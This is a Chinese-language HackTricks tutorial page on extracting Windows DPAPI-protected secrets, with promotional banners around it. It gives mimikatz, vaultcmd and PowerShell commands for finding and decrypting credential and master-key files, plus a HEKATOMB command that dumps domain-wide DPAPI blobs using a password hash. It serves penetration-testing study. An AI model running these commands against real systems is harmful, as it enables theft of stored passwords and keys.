# DPAPI - 提取密码

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧**。

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流地。

{% embed url="https://www.rootedcon.com/" %}

## 什么是DPAPI

数据保护API（DPAPI）主要用于Windows操作系统中对**非对称私钥进行对称加密**，利用用户或系统密钥作为重要的熵源。这种方法通过允许开发人员使用从用户登录密钥派生的密钥或者对于系统加密来说，使用系统的域认证密钥来加密数据，从而简化了开发人员的加密过程，避免了开发人员自行管理加密密钥的需要。

### DPAPI保护的数据

DPAPI保护的个人数据包括：

* Internet Explorer和Google Chrome的密码和自动填充数据
* Outlook和Windows Mail等应用程序的电子邮件和内部FTP帐户密码
* 共享文件夹、资源、无线网络和Windows Vault的密码，包括加密密钥
* 远程桌面连接、.NET Passport以及用于各种加密和身份验证目的的私钥的密码
* 由凭据管理器管理的网络密码以及使用CryptProtectData的应用程序中的个人数据，例如Skype、MSN Messenger等

## 列出保险库
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 凭证文件

**受保护的凭证文件**可能位于：
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
使用mimikatz `dpapi::cred` 获取凭据信息，在响应中您可以找到有趣的信息，如加密数据和guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
你可以使用**mimikatz模块** `dpapi::cred` 和适当的 `/masterkey` 来解密：
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## 主密钥

用于加密用户RSA密钥的DPAPI密钥存储在`%APPDATA%\Microsoft\Protect\{SID}`目录下，其中{SID}是该用户的[**安全标识符**](https://en.wikipedia.org/wiki/Security\_Identifier)。**DPAPI密钥存储在与保护用户私钥的主密钥相同的文件中**。通常是64个字节的随机数据。(请注意，此目录受保护，因此您无法使用cmd的`dir`命令列出它，但您可以使用PS列出它)。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
以下是用户的一堆主密钥的样子：

![](<../../.gitbook/assets/image (1121).png>)

通常**每个主密钥都是一个加密的对称密钥，可以解密其他内容**。因此，**提取**加密的**主密钥**很有趣，以便稍后**解密**使用它加密的**其他内容**。

### 提取主密钥并解密

查看帖子[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)以了解如何提取主密钥并解密它的示例。

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1)是[@gentilkiwi](https://twitter.com/gentilkiwi)的[Mimikatz](https://github.com/gentilkiwi/mimikatz/)项目中一些DPAPI功能的C#移植。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)是一个工具，可以自动提取LDAP目录中的所有用户和计算机，以及通过RPC提取域控制器备份密钥。然后脚本将解析所有计算机的IP地址，并在所有计算机上执行smbclient以检索所有用户的所有DPAPI blob，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从LDAP计算机列表中提取，即使您不知道它们，也可以找到每个子网络！

"因为域管理员权限还不够。攻破它们全部。"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)可以自动转储由DPAPI保护的机密。

## 参考资料

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)是**西班牙**最相关的网络安全活动之一，也是**欧洲**最重要的活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点聚会。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧。

</details>
